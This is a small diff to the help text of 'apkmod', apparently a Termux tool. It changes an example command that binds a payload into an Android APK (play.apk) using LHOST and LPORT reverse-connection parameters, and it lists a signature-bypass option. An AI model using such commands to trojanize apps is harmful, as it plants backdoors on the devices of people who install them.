@@ -45,7 +45,7 @@ usage() {
     --signature-bypass  Bypass signature verification
 
     ${yellow}Example:
-    ${blue}apkmod -b /sdcard/apps/play.apk -o /sdcard/apps/binded_play.apk LHOST=127.0.0.1 LPORT=4444
+    ${blue}apkmod -b -i /sdcard/apps/play.apk -o /sdcard/apps/binded_play.apk LHOST=127.0.0.1 LPORT=4444
     ${purple}bind the payload with play.apk and saves output in given directory.
 
     ${green}Apkmod is like a bridge between your termux and 
